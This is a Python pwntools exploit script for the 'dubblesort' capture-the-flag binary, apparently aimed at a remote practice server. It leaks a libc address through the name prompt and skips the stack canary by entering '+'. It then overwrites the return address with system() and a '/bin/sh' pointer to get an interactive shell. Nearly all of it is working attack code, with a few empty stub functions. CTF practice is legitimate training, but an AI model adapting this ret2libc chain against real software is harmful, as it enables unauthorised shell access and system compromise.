#coding=utf-8
from pwn import *
local = 0
exec_file="./dubblesort"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",28073)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *$rebase(0x00000B17)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def add(size):
    return 

def delete(idx):
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]

#debug()
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33
a.sendafter("What your name :","a"*0x1c)
a.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
libc_base = u32(a.recv(4)) - 0x1244 -0x1b0000
fuck(libc_base)
canary_off = 23
ebp_off = 31
ROP_chain = p32(0x3ac6c + libc_base)
binsh = libc.search('/bin/sh').next() + libc_base 
a.sendlineafter("How many numbers do you what to sort :",str(38))
for i in range(24):
    a.recvuntil("Enter the "+str(i)+ " number : ")
    a.sendline(str(0))
a.recvuntil("Enter the "+str(24)+ " number : ")
a.sendline('+')
for i in range(10):
    a.recvuntil("Enter the "+str(25+i)+ " number : ")
    a.sendline(str(0x00000417 + libc_base)) 
a.recvuntil("Enter the "+str(35)+ " number : ")
a.sendline(str(libc.sym["system"] + libc_base)) 
for i in range(2):   
    a.recvuntil("Enter the "+str(36+i)+ " number : ")
    a.sendline(str(binsh))

a.interactive()
